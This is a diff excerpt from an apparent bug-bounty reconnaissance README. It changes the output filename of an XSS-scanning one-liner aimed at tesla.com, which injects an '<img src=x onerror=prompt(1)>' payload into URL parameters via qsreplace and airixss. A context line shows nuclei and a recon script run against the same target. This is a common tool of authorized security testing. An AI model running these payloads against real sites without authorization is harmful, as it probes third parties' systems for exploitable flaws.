@@ -44,7 +44,7 @@ TARGET=tesla.com; python3 recon-bluster.py -d $TARGET; nuclei -silent -l $TARGET
 ```
 ## AIRIXSS
 ```shell
-TARGET=tesla.com; cat $TARGET/target_xss.txt | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>' | grep "31mVulnerable" | anew $TARGET/target_xss_airixss_$(date +%Y-%m-%d_%H:%M:%S).txt
+TARGET=tesla.com; cat $TARGET/target_xss.txt | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>' | grep "31mVulnerable" | anew target_xss_airixss.txt
 ```
 # Credit
 * [assetfinder](https://github.com/tomnomnom/assetfinder)
